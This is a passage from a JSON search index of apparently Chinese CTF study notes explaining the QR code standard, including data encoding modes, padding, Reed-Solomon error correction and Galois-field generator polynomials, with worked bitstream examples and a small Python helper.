Q\uff1a25% H\uff1a30%","title":"\u57fa\u7840\u63cf\u8ff0\uff085.3\u30016.1\uff09"},{"location":"ctf/qrcode/#63","text":"\u529f\u80fd\u56fe\u6848\uff08function patterns\uff09 \u7279\u5f81\u7b26\uff08finder pattern\uff097x7\u9ed1\u5708 5x5\u767d\u5708 3x3\u9ed1\u5757 \u5206\u5272\u7ebf\uff08separator\uff09\u5728\u7279\u5f81\u7b26\u5468\u56f4\u7684\u4e00\u5708\u5168\u767d\u533a\u57df \u65f6\u5e8f\u56fe\u6848\uff08timing patterns\uff09\u7b2c7\u884c\u7b2c7\u5217\u7684\u4e24\u6761\u9ed1\u767d\u6761\u7eb9 \u5bf9\u9f50\u56fe\u6848\uff08alignment patterns\uff09\u7248\u672c1\u65e0\uff0c\u7248\u672c2-6 1\u4e2a\uff0c\u7248\u672c7-13 6\u4e2a\u2026\u2026\uff08\u9644\u5f55E\uff09 \u9759\u9ed8\u533a\uff08quiet zone\uff09\u81f3\u5c114\u4e2a\u5355\u4f4d\u5bbd \u7f16\u7801\u533a\u57df\uff08encoding region\uff09 \u683c\u5f0f\u4fe1\u606f\uff08format information\uff09\u5de6\u4e0a\u89d2\u5206\u5272\u7ebf\u5916\u4e00\u5708\uff0c\u5de6\u4e0b\u89d2\u5206\u5272\u7ebf\u53f3\u4fa7\uff0c\u53f3\u4e0a\u89d2\u5206\u5272\u7ebf\u4e0b\u4fa7 \u7248\u672c\u4fe1\u606f\uff08version information\uff09\u7248\u672c7\u540e\u624d\u6709\uff0c\u5728\u5de6\u4e0b\u5206\u5272\u7ebf\u4e0a\u4fa7\uff0c\u53f3\u4e0a\u5206\u5272\u7ebf\u5de6\u4fa7 \u6570\u636e\u53ca\u7ea0\u9519\u7801\u533a\u57df","title":"\u4e8c\u7ef4\u7801\u7ed3\u6784\uff086.3\uff09"},{"location":"ctf/qrcode/#74","text":"","title":"\u6570\u636e\u7f16\u7801\uff087.4\uff09"},{"location":"ctf/qrcode/#741","text":"\u9ed8\u8ba4\u7684 ECI \u6a21\u5f0f\u4e0b\uff0c\u6bd4\u7279\u6d41\u4ee5\u6a21\u5f0f\u6807\u8bc6\u7b26\u5f00\u59cb\u3002\u5982\u679c\u4e0d\u662f\u9ed8\u8ba4 ECI \u6a21\u5f0f\uff0c\u5219\u9700\u8981\u4ece ECI \u5934\u5f00\u59cb\uff1a \uff084 bits\uff09ECI \u6a21\u5f0f\u6807\u8bc6\u7b26 \uff088/16/24 bits\uff09ECI Designator \u6bd4\u7279\u6d41\u7684\u5269\u4f59\u90e8\u5206\u7531\u4e0b\u9762\u51e0\u90e8\u5206\u7ec4\u6210\uff1a \uff084 bits\uff09\u6a21\u5f0f\u6807\u8bc6\u7b26 \u5b57\u7b26\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u89c1\u4e0b\u7b2c\u4e8c\u4e2a\u8868\uff09 \u6570\u636e\u6bd4\u7279\u6d41 \u6a21\u5f0f \u6807\u8bc6\u7b26 \u8bf4\u660e ECI 0111 \u6570\u5b57\u6a21\u5f0f 0001 \u53ea\u5305\u542b\u6570\u5b570-9\uff0c3\u4e2a\u6570\u5b57 10 bits \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f 0010 45\u4e2a\u5b57\u7b26\uff0c0-9A-Z \u53ca9\u4e2a\u7b26\u53f7 \u7a7a\u683c$%*+-./:\uff0c2\u4e2a\u5b57\u7b26 11 bits \u5b57\u8282\u6a21\u5f0f 0100 \u6bcf\u4e2a\u5b57\u7b26 8 bits \u65e5\u672c\u6c49\u5b57\u6a21\u5f0f 1000 \u7ed3\u6784\u6dfb\u52a0\u6a21\u5f0f 0011 \u7248\u672c \u6570\u5b57\u6a21\u5f0f\u5b57\u7b26\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6 \u5b57\u6bcd\u6a21\u5f0f\u2026\u2026 \u5b57\u8282\u6a21\u5f0f\u2026\u2026 \u65e5\u6587\u6a21\u5f0f\u2026\u2026 1\uff5e9 10 9 8 8 10\uff5e26 12 11 16 10 27\uff5e40 14 13 16 12","title":"\u6570\u636e\u5e8f\u5217\uff087.4.1\uff09"},{"location":"ctf/qrcode/#eci-742","text":"ECI \u6a21\u5f0f\u5373\u4f7f\u7528\u67d0\u4e9b\u7279\u5b9a\u7684\u5b57\u7b26\u6620\u5c04\u6765\u628a\u5b57\u7b26\u8f6c\u6362\u4e3a\u6bd4\u7279\u6d41 \u800c\u4e14\u90fd\u4f7f\u7528\u5b57\u8282\u6a21\u5f0f\u6765\u8868\u793a\u6570\u636e\uff08\u5373\u5728 ECI \u5934\u540e\u7684\u6a21\u5f0f\u6807\u8bc6\u7b26\u4e3a\u5b57\u8282\u6a21\u5f0f\u7684 0100\uff09 \u6bcf\u4e2a ECI \u90fd\u6709\u4e00\u4e2a\u516d\u4f4d\u6570\u7f16\u53f7\uff08assignment value\uff09\uff0c\u53ef\u80fd\u5360 1\u30012\u30013 \u4e2a codewords\uff0c\u5177\u4f53\u6807\u8bc6\u65b9\u5f0f\u89c1\u4e0b\u8868\uff08\u53601\u4e2a codewords \u65f6\u5f00\u5934\u4e00\u5b9a\u662f0\uff0c\u53602\u4e2a\u65f6\u5f00\u5934\u4e00\u5b9a\u662f10\uff0c\u53603\u4e2a\u65f6\u5f00\u5934\u4e00\u5b9a\u662f110\uff09\u8868\u4e2d xxxxxxxx \u8868\u793a\u7f16\u53f7\u7684\u4e8c\u8fdb\u5236 ECI Assignment Value Codewords values 000000 \uff5e 000127 0xxxxxxx 000000 \uff5e 016383 10xxxxxx xxxxxxxx 000000 \uff5e 999999 110xxxxx xxxxxxxx xxxxxxxx \u800c\u4e14 ECI \u6a21\u5f0f\u4e0b\u4e2d\u9014\u53ef\u4ee5\u66f4\u6362 ECI \u6307\u793a\u5668\uff0c\u4e00\u4e2a 5C\uff0801011100\uff09\u8868\u793a\u6362\u65b0\u7684 ECI\uff0c\u540e\u9762\u8981\u63a56\u4e2a codewords \u53736\u4e2a\u6570\u5b57\uff08\u5341\u516d\u8fdb\u523630\uff5e39\uff09\u8868\u793a\u7f16\u53f7\uff0c\u800c\u4e0d\u662f\u7528\u4e0a\u8868\u4e2d\u7684\u8868\u793a\u65b9\u6cd5\u3002\u800c 5C \u6b63\u5e38\u60c5\u51b5\u4e0b\u8868\u793a \uff0c\u6240\u4ee5\u8868\u793a \u8fd9\u4e2a\u539f\u6570\u636e\u9700\u8981\u7528\u4e24\u4e2a 5C \u4f8b\u5b50 1 \u4f7f\u7528 ISO/IEC 8859-7\uff08ECI 000009\uff09\u6765\u8868\u793a\u5e0c\u814a\u5b57\u6bcd\u0391\u0392\u0393\u0394\u0395\uff08\u8be5 ECI \u4e0b\u8868\u793a\u4e3a\u5341\u516d\u8fdb\u5236 A1 A2 A3 A4 A5\uff09 \u6bd4\u7279\u6d41\uff1a ECI \u6807\u8bc6\u7b26\uff1a 0111 ECI \u7f16\u53f7\uff1a 00001001 \u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0100 \u5b57\u7b26\u6570\u91cf\uff1a 00000101 \uff085\u4e2a\u5b57\u7b26\uff09 \u6570\u636e\uff1a 10100001 10100010 10100011 10100100 10100101 \u6240\u4ee5\u6700\u7ec8\u7684\u6bd4\u7279\u6d41\uff1a 0111 00001001 0100 00000101 10100001 10100010 10100011 10100100 10100101 \u4f8b\u5b50 2\uff0814.3\uff09 \u9700\u8981\u7f16\u7801\u7684\u6570\u636e\uff1aABC\\123456 \u6570\u636e\u6d41\u4e2d\u5341\u516d\u8fdb\u5236\uff08\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b260100\u540e\uff09\uff1a41 42 43 5C 5C 31 32 33 34 35 36 \u9700\u8981\u7f16\u7801\u7684\u6570\u636e\uff1aABC<\u540e\u63a5 ECI 123456 \u4e0b\u7684\u6570\u636e\u2026\u2026> \u6570\u636e\u6d41\u4e2d\u5341\u516d\u8fdb\u5236\uff08\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b260100\u540e\uff09\uff1a41 42 43 5C 31 32 33 34 35 36 \u2026\u2026","title":"ECI \u6a21\u5f0f\uff087.4.2\uff09"},{"location":"ctf/qrcode/#743","text":"\u8f93\u5165\u7684\u6570\u5b57\u5b57\u7b26\u4e32\uff08\u56e0\u4e3a\u5f00\u5934\u53ef\u4ee5\u662f0\uff09\u8981\u88ab\u5206\u62103\u4e2a\u4e00\u7ec4\uff0c\u6bcf\u7ec4\u4f1a\u8f6c\u6362\u4e3a 10 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08999 -> 1111100111 \uff09\u3002\u5269\u4f59\u4e0d\u52303\u4e2a\u7684\u90e8\u5206\uff0c\u5982\u679c\u52692\u4e2a\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a 7 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff0899 -> 1100011 \uff09\u5982\u679c\u52691\u4e2a\u6570\u5b57\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a 4 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff089 -> 1001 \uff09 \u7136\u540e\u5f00\u5934\u52a0\u4e0a\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26 0001 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u5b57\u7b26\u4e2a\u6570\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff0c\u5e76\u5f00\u5934\u88650\u81f3\u957f\u5ea6\uff0c\u957f\u5ea6\u7531\u7248\u672c\u51b3\u5b9a\uff0c\u89c1\u4e0a 7.4.1 \u90e8\u5206\u7684\u7b2c\u4e8c\u4e2a\u8868\uff09 \u4f8b\u5b50 \u6570\u636e\u5185\u5bb9\uff1a 01234567 \uff08\u4fdd\u7559\u5f00\u59340\uff09 \u6570\u636e\u6d41\u90e8\u5206\uff1a \u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0001 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 0000001000 \uff088\uff0c\u4e14\u7248\u672c1\u4e0b\u89c4\u5b9a\u4e3a 10 bits\uff09 \u6570\u636e\uff1a 012 -> 0000001100 345 -> 0101011001 67 -> 1000011 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0001 0000001000 0000001100 0101011001 1000011 \u6570\u5b57\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\u4e3a\uff1a \\[ B=M+C+10\\times\\lfloor\\frac{D}{3}\\rfloor+R \\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff08\u7248\u672c1\uff5e9\u4e3a 10\uff0c\u7248\u672c10\uff5e26\u4e3a 12\uff0c\u7248\u672c27\uff5e40\u4e3a 14\uff09\uff0cD\u4e3a\u8f93\u5165\u5b57\u7b26\u4e2a\u6570\uff0cR\u4e3a\u5269\u4f59\u90e8\u5206\uff08\u82e5 D mod 3 = 0 \u5219\u4e3a 0\uff0c\u82e5 D mod 3 = 1 \u5219\u4e3a 4\uff0c\u82e5 D mod 3 = 2 \u5219\u4e3a 7\uff09","title":"\u6570\u5b57\u6a21\u5f0f\uff087.4.3\uff09"},{"location":"ctf/qrcode/#744","text":"\u6570\u5b57\u5b57\u6bcd\u6a21\u5f0f\uff08Alphanumeric mode\uff09\u4e0b\u652f\u6301\u7684\u7f16\u7801\u5b57\u7b26\u670945\u4e2a\uff0c\u628a\u5b83\u4eec\u4ece0\u7f16\u53f7\u81f344\u3002\u5176\u4e2d 0-9 \u5bf9\u5e94\u6570\u5b57 0-9\uff0c10-35 \u5bf9\u5e94\u5b57\u6bcd A-Z\uff0c36-44 \u5bf9\u5e949\u4e2a\u7b26\u53f7\uff1a \u8f93\u5165\u7684\u5b57\u7b26\u5148\u6309\u7167\u4e0a\u8868\u8f6c\u6362\u4e3a\u6570\u503c\uff0c\u7136\u540e\u5206\u4e3a\u4e24\u4e2a\u4e00\u7ec4\uff0c\u6bcf\u4e00\u7ec4\u5185\u628a \u7b2c\u4e00\u4e2a\u6570\u503c \u00d7 45 + \u7b2c\u4e8c\u4e2a\u6570\u503c\uff0c\u518d\u8f6c\u6362\u4e3a\u957f\u5ea6\u4e3a 11 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08\u6700\u5927\u4e3a 44\u00d745+44=2024 -> 11111101000 \uff09\u3002\u5982\u679c\u5b57\u7b26\u957f\u5ea6\u4e3a\u5947\u6570\uff0c\u5219\u4f1a\u5269\u4f59\u51fa\u4e00\u4e2a\u5b57\u7b26\uff0c\u9700\u8981\u5c06\u5176\u503c\u8f6c\u6362\u4e3a\u957f\u5ea6\u4e3a 6 bits \u7684\u4e8c\u8fdb\u5236\u4e32\uff08\u6700\u5927\u4e3a 11 -> 101100 \uff09 \u7136\u540e\u5f00\u5934\u52a0\u4e0a\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26 0010 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u7531 7.4.1 \u7b2c\u4e8c\u4e2a\u8868\u89c4\u5b9a\uff09 \u4f8b\u5b50 \u6570\u636e\u5185\u5bb9\uff1aAC-42 \u6570\u636e\u6d41\u90e8\u5206\uff1a \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u6807\u8bc6\u7b26\uff1a 0010 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 000000101 \uff085\uff0c\u4e14\u7248\u672c1\u4e0b\u89c4\u5b9a\u957f\u5ea6\u4e3a9\uff09 \u6570\u636e\uff1aAC-42 -> 10 12 41 4 2 -> (10 12)(41 4)(2) 10 12 -> 10*45+12=462 -> 00111001110 41 4 -> 41*45+4=1849 -> 11100111001 2 -> 2 -> 000010 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0010 000000101 00111001110 11100111001 000010 \u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\u4e3a\uff1a \\[B=M+C+11\\times\\lfloor\\frac{D}{2}\\rfloor+6\\times(D\\bmod 2)\\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff0cD \u4e3a\u539f\u6570\u636e\u957f\u5ea6","title":"\u5b57\u6bcd\u6570\u5b57\u6a21\u5f0f\uff087.4.4\uff09"},{"location":"ctf/qrcode/#745","text":"\u5b57\u8282\u6a21\u5f0f\uff08Byte mode\uff09\u4e0b\u628a\u6bcf\u4e2a\u5b57\u7b26\u6839\u636e Latin-1\uff08ISO/IEC 8859-1\uff09\u7f16\u7801\u6210 8 bits\uff081\u5b57\u8282\uff09\uff0c\u76f4\u63a5\u63a5\u5728\u5b57\u8282\u6a21\u5f0f\u6807\u8bc6\u7b26 0100 \u548c\u6570\u91cf\u6807\u8bc6\u7b26\uff08\u957f\u5ea6\u7531 7.4.1 \u7b2c\u4e8c\u4e2a\u8868\u89c4\u5b9a\uff09\u7684\u540e\u9762\u3002 Latin-1 \u5b57\u8282\u6a21\u5f0f\u4e0b\u7684\u6bd4\u7279\u6d41\u957f\u5ea6\uff1a \\[B=M+C+8\\times D\\] \u5176\u4e2d M \u4e3a 4\uff0cC \u4e3a\u6570\u91cf\u6807\u8bc6\u7b26\u957f\u5ea6\uff0cD \u4e3a\u539f\u6570\u636e\u957f\u5ea6","title":"\u5b57\u8282\u6a21\u5f0f\uff087.4.5\uff09"},{"location":"ctf/qrcode/#_1","text":"\u4e2d\u6587\u5728\u8f6c\u6362\u6210\u6bd4\u7279\u6d41\u7684\u65f6\u5019\u4e5f\u4f7f\u7528\u5b57\u8282\u6a21\u5f0f\uff0c\u9700\u8981\u7528 UTF-8 \u7f16\u7801\uff0c\u6bcf\u4e2a\u5b57\u7b26\u4f1a\u88ab\u7f16\u7801\u6210 3 \u4e2a\u5b57\u8282","title":"\u4e2d\u6587\u7f16\u7801"},{"location":"ctf/qrcode/#747","text":"\u4e00\u4e2a\u4e8c\u7ef4\u7801\u7684\u6570\u636e\u6d41\u4e2d\u4e5f\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u6a21\u5f0f\uff0c\u4e14\u4e0d\u9700\u8981\u7279\u522b\u8868\u793a\u3002\u66f4\u6362\u65b0\u7684\u6a21\u5f0f\u65f6\u53ea\u9700\u8981\u6b63\u5e38\u6dfb\u52a0 \u6a21\u5f0f\u6807\u8bc6\u7b26+\u6570\u91cf\u6807\u8bc6\u7b26+\u6570\u636e \u5373\u53ef \u4f8b\u5b50 \u539f\u59cb\u6570\u636e\uff1a123\u6d4b\u8bd5 \u6570\u636e\u6d41\uff1a \u6570\u5b57\u6a21\u5f0f\uff1a \u6807\u8bc6\u7b26\uff1a 0001 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 0000000011 \uff083\uff0c\u957f\u5ea610\uff09 \u6570\u636e\uff1a123 -> 0001111011 \u5b57\u8282\u6a21\u5f0f\uff1a\u6d4b\u8bd5 -> E6 B5 8B / E8 AF 95 \u6807\u8bc6\u7b26\uff1a 0100 \u6570\u91cf\u6807\u8bc6\u7b26\uff1a 00000110 \uff086\uff0c\u957f\u5ea68\uff09 \u6570\u636e\uff1a \u6d4b -> 11100110 10110101 10001011 \u8bd5 -> 11101000 10101111 10010101 \u5b8c\u6574\u6570\u636e\u6bd4\u7279\u6d41\uff1a 0001 0000000011 0001111011 0100 00000110 11100110 10110101 10001011 11101000 10101111 10010101","title":"\u6df7\u5408\u6a21\u5f0f\uff087.4.7\uff09"},{"location":"ctf/qrcode/#749","text":"\u5728\u6570\u636e\u7684\u672b\u5c3e\u8981\u586b\u51454\u4e2a0\u4f5c\u4e3a\u7ed3\u675f\u7b26\uff0c\u5982\u679c\u5bb9\u91cf\u4e0d\u8db3\u7684\u8bdd\u53ef\u4ee5\u7f29\u77ed\u6216\u7701\u7565 \u5373\u80fd\u586b\u4e0b\u5219\u52a04\u4e2a0\uff0c\u586b\u4e0d\u4e0b\u5219\u80fd\u52a0\u51e0\u4e2a0\u5c31\u52a0\u51e0\u4e2a0","title":"\u7ed3\u675f\u7b26\uff087.4.9\uff09"},{"location":"ctf/qrcode/#padding-bits7410","text":"\u8f6c\u6362\u540e\u7684\u6570\u636e\u6bd4\u7279\u6d41\u8fd8\u9700\u8981\u586b\u5145\u81f3\u4e8c\u7ef4\u7801\u7684\u6570\u636e\u5bb9\u91cf \u9996\u5148\u5148\u7528 0 \u8865\u5145\u6bd4\u7279\u6d41\u957f\u5ea6\u5230 8 \u7684\u6574\u6570\u500d \u7136\u540e\u7528 11101100 \u548c 00010001 \u4ea4\u66ff\u586b\u8865\u5230\u4e8c\u7ef4\u7801\u6570\u636e\u5bb9\u91cf \u5177\u4f53\u7684\u6570\u636e\u5bb9\u91cf\u7531\u7248\u672c\u53f7\u548c\u7ea0\u9519\u7b49\u7ea7\u51b3\u5b9a\uff0c\u4e14\u6570\u636e\u5bb9\u91cf\uff08\u6bd4\u7279\uff09\u4e00\u5b9a\u4e3a8\u7684\u500d\u6570\uff0c\u5b8c\u6574\u6570\u636e\u89c1\u6587\u6863\u7684 33\uff5e36 \u9875\uff08\u6574\u4e2a pdf \u7684\u7b2c 41\uff5e44 \u9875\uff09 \u6ce8 \u8fd9\u4e2a\u5730\u65b9 QRazyBox \u7f51\u7ad9\u5b58\u5728 bug\uff0c\u6709\u65f6\u65e0\u6cd5\u6b63\u5e38\u8bc6\u522b\u586b\u5145\u7684 0 \u6bd4\u7279\u548c padding bits\uff08\u5373\u53ef\u80fd\u628a\u586b\u5145\u7684 0 \u4e2d\u524d\u56db\u4e2a\u89c6\u4e3a\u4e00\u4e2a terminator\uff0c\u628a\u540e\u9762\u7684 0 \u624d\u89c6\u4e3a\u5c5e\u4e8e padding bits \uff09","title":"\u586b\u5145 padding bits\uff087.4.10\uff09"},{"location":"ctf/qrcode/#75","text":"","title":"\u7ea0\u9519\u7801\u7f16\u7801\uff087.5\uff09"},{"location":"ctf/qrcode/#751","text":"\u7ea0\u9519\u5b57\uff08error correction codewords\uff09\u53ef\u4ee5\u7ea0\u6b63\u4e24\u79cd\u9519\u8bef\uff0c\u4e00\u79cd\u662f\u6bd4\u5982\u65e0\u6cd5\u626b\u63cf\u6216\u65e0\u6cd5\u89e3\u7801\u7684\u5df2\u77e5\u4f4d\u7f6e\u7684\u9519\u8bef\u5b57\uff08erasures\uff09\uff0c\u4e00\u79cd\u662f\u672a\u77e5\u4f4d\u7f6e\u7684\u9519\u8bef\u5b57\uff08errors\uff09\uff0c\u4e00\u4e2a erasures \u53ef\u4ee5\u7531\u4e00\u4e2a\u7ea0\u9519\u5b57\u7ea0\u9519\uff0c\u800c\u4e00\u4e2a errors \u9700\u8981\u4e24\u4e2a\u7ea0\u9519\u5b57\u6765\u7ea0\u9519 \u53ef\u4ee5\u7ea0\u9519\u7684 erasures \u548c errors \u7684\u6570\u91cf\u6ee1\u8db3\uff1a \\[e+2t\\leq d-p\\] \u5176\u4e2d \\(e\\) \u662f erasures \u7684\u6570\u91cf\uff0c \\(t\\) \u662f errors \u7684\u6570\u91cf\uff0c \\(d\\) \u662f\u7ea0\u9519\u5b57\u7684\u6570\u91cf\uff0c \\(p\\) \u662f\u88ab\u9519\u8bef\u89e3\u6790\u7684\u4fdd\u62a4\u5b57\u6570\u91cf \u5176\u4e2d \\(p\\) \u7531\u7248\u672c\u51b3\u5b9a\uff1a \\(p=3\\) \uff1a\u7248\u672c 1-L \\(p=2\\) \uff1a\u7248\u672c 1-M\u30012-L \\(p=1\\) \uff1a\u7248\u672c 1-Q\u30011-H\u30013-L \\(p=0\\) \uff1a\u5176\u4ed6\u6240\u6709\u7248\u672c","title":"\u7ea0\u9519\u5bb9\u91cf\uff087.5.1\uff09"},{"location":"ctf/qrcode/#_2","text":"\u6839\u636e\u7248\u672c\u53f7\u53ca\u7ea0\u9519\u7b49\u7ea7\uff0c\u6570\u636e\u5e8f\u5217\u9700\u8981\u88ab\u5206\u6210 1 \u4e2a\u6216\u591a\u4e2a\u5757\uff0c\u6bcf\u5757\u5185\u9700\u8981\u5355\u72ec\u7f16\u7801\u7ea0\u9519\u7801 \u5982\u679c\u9700\u8981\u8865\u5145\u7684\u8bdd\u4e00\u5f8b\u5168\u90e8\u8865\u5145 0 \u6bd4\u7279\u5230\u9700\u8981\u7684\u957f\u5ea6 \u5177\u4f53\u4e0d\u540c\u7248\u672c\u7684\u5206\u5757\u5757\u6570\u548c\u6bcf\u5757\u4e2d\u6570\u91cf\u5b89\u6392\u4ee5\u53ca\u7ea0\u9519\u5bb9\u91cf\u90fd\u5728\u6587\u6863\u4e2d P38-44\uff08pdf \u4e2d P46-52\uff09\u7684\u5927\u8868\u683c Table 9 \u4e2d","title":"\u5206\u5757\u7f16\u7801\u7ea0\u9519\u7801"},{"location":"ctf/qrcode/#752","text":"","title":"\u751f\u6210\u7ea0\u9519\u7801\uff087.5.2\uff09"},{"location":"ctf/qrcode/#_3","text":"\u751f\u6210\u7ea0\u9519\u7801\u4e4b\u524d\u8981\u5148\u5c06\u6240\u6709\u6570\u636e\u5b57\u8f6c\u6362\u6210\u4e00\u4e2a\u591a\u9879\u5f0f\uff0c\u4f7f\u5176\u9650\u5236\u4e8e\u4f3d\u7f57\u74e6\u57df \\(GF(2^3)\\bmod 100011101\\) \u4e2d\uff0c\u800c\u4e14\u540e\u7eed\u7684\u56db\u5219\u8fd0\u7b97\u4e5f\u90fd\u662f\u8be5\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u8fd0\u7b97 \u5177\u4f53\u4f3d\u7f57\u74e6\u57df\u7684\u751f\u6210\u539f\u7406\u53ef\u4ee5\u770b\uff1a https://www.codenong.com/cs105738710/ \u7b80\u5355\u6765\u8bf4\u5c31\u662f\u591a\u9879\u5f0f\u7684\u52a0\u51cf\u6cd5\u90fd\u662f\u5f02\u6216\uff0c\u4e58\u9664\u6cd5\u8981\u6bcf\u4e00\u4e2a\u6bd4\u7279\u6a21 2\uff0c\u6bcf\u4e00\u4e2a\u5b57\u8282\u6a21 100011101\uff08\u5373\u8be5\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u672c\u539f\u591a\u9879\u5f0f \\(x^8+x^4+x^3+x^2+1\\) \uff09 \u5177\u4f53\u591a\u9879\u5f0f mod \u8fd0\u7b97\u7684\u65b9\u6cd5\u53ef\u4ee5\u770b\uff1a https://blog.csdn.net/yaongtime/article/details/17200401 \u7b80\u5355\u6765\u8bf4\u5c31\u662f\u591a\u9879\u5f0f\u7684\u957f\u9664\u6cd5\u53d6\u6a21\uff0c\u800c\u4e14\u6ce8\u610f\u8fd9\u91cc\u7684\u52a0\u51cf\u90fd\u662f\u4f3d\u7f57\u74e6\u57df\u4e2d\u7684\u52a0\u51cf\uff0c\u5373\u5f02\u6216","title":"\u4f3d\u7f57\u74e6\u57df"},{"location":"ctf/qrcode/#annex-a","text":"\u7ea0\u9519\u7801\u751f\u6210\u591a\u9879\u5f0f\u7684\u4e00\u822c\u8868\u8fbe\u5f62\u5f0f\u662f\uff1a \\[g(x)=(x-\\alpha^0)(x-\\alpha^1)\\cdots(x-\\alpha^{n-1})\\] \u5176\u4e2d \\(n\\) \u4e3a\u7ea0\u9519\u7801\u5b57\u7684\u4e2a\u6570\uff0c\u5176\u4e2d \\(\\alpha=2\\) \uff0c \\(\\alpha^k\\) \u7684\u662f\u5728\u4f3d\u7f57\u74e6\u57df\u4e0b\u7684\u8fd0\u7b97\uff0c\u5373\uff1a \\(\\alpha^0 = 1;\\ \\alpha^1=2;\\ \\alpha^2=4;\\ \\cdots;\\ \\alpha^7=128\\) \\(\\alpha^8=256\\bmod 285=256\\oplus 285=29;\\ \\alpha^9=29\\times2=58;\\ \\cdots\\) \u5177\u4f53\u8ba1\u7b97 \\(\\alpha^k\\) \u7684\u4ee3\u7801\uff1a def alpha ( k ): res = 1 for _ in range ( k ): res *= 2 if res >= 256 : res ^= 285 return res \u6587\u6863\u9644\u5f55 A \u4e2d\u5df2\u7ecf\u5c55\u5f00\u4e86\u6240\u6709\u53ef\u80fd \\(n\\) \u503c\u4e0b\u768436\u4e2a\u751f\u6210\u591a\u9879\u5f0f","title":"\u751f\u6210\u591a\u9879\u5f0f\uff08Annex A\uff09"},{"location":"ctf/qrcode/#_4","text":"\u6587\u6863\u91cc\u7ed9\u4e86\u4e00\u4e2a\u611f\u89c9\u6bd4\u8f83\u6666\u6da9\u96be\u61c2\u7684\u56fe\u6765\u5c55\u793a\u751f\u6210\u7ea0\u9519\u7801\u7684\u8fc7\u7a0b\uff1a \u4e0d\u662f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u4e8e\u662f\u627e\u4e86\u53e6\u4e00\u7bc7\u6587\u7ae0\uff1a https://blog.csdn.net/ljm1995/article/details/88819664 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u6bd4\u5982\u8981\u7f16\u7801 12345678 \u8fd9\u516b\u4e2a\u6570\u5b57 \u7248\u672c 1-L\uff0c\u67e5 Table 9 \u5f97\u5230\u5206\u4e3a 1 \u5757\uff0c\u4e14\u8be5\u5757\u5185\u603b\u5b57\u6570\u4e3a 26\uff0c\u6570\u636e\u5b57\u6570\u4e3a 19\uff0c\u7ea0\u9519\u5b57\u6570\u4e3a 26-19=7 \u6839\u636e\u524d\u9762\u6240\u8bf4\uff0c\u6bd4\u7279\u6d41\u5e94\u8be5\u662f\uff1a 0001 0000001000 0001111011 0111001000 1001110 0000 \u8865\u6210 8 \u7684\u500d\u6570\u957f\u5ea6\uff1a 00010000 00100000 01111011 01110010 00100111 00000000 \u6dfb\u52a0 padding bits\uff08\u8865\u5230 19 \u4e2a\u5b57\u8282\uff09\uff1a 00010000 00100000 01111011 01110010 00100111 00000000 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 00010001 11101100 \u5199\u6210\u591a\u9879\u5f0f\u5f62\u5f0f\uff0c\u6b21\u6570\u662f 19 \u6b21\uff0c\u6574\u4f53\u4e58 \\(x^7\\) \uff1a \\[16x^{25}+32x^{24}+123x^{23}+114x^{22}+39x^{21}+236x^{19}+\\\\\\\\17x^{18}+236x^{17}+17x^{16}+236x^{15}+17x^{14}+236x^{13}+\\\\\\\\17x^{12}+236x^{11}+17x^{10}+236x^{9}+17x^{8}+236x^{7}\\] \u518d\u67e5\u9644\u5f55 A \u5f97\u5230\u6b21\u6570\u4e3a 7 \u7684\u751f\u6210\u591a\u9879\u5f0f\uff0c\u5e76\u6574\u4f53\u4e58 \\(x^{18}\\) \uff1a \\[x^{25}+\\alpha^{87}x^{24}+\\alpha^{229}x^{23}+\\alpha^{146}x^{22}+\\alpha^{149}x^{21}+\\\\\\\\\\alpha^{238}x^{20}+\\alpha^{102}x^{19}+\\alpha^{21}x^{18}\\] \u7136\u540e\u628a\u7b2c\u4e00\u4e2a\u591a\u9879\u5f0f\u9664\u7b2c\u4e8c\u4e2a\u591a\u9879\u5f0f\u53d6\u4f59\u6570 \u53ef\u4ee5\u8fd9\u6837\u8ba1\u7b97\uff0c\u628a\u7b2c\u4e8c\u4e2a\u591a\u9879\u5f0f\u6574\u4f53\u4e58 16 \u5373 \\(\\alpha^4\\) \uff1a \\[\\alpha^4x^{25}+\\alpha^{91}x^{24}+\\alpha^{233}x^{23}+\\alpha^{150}x^{22}+\\alpha^{153}x^{21}+\\\\\\\\\\alpha^{242}x^{20}+\\alpha^{106}x^{19}+\\alpha^{25}x^{18}\\] 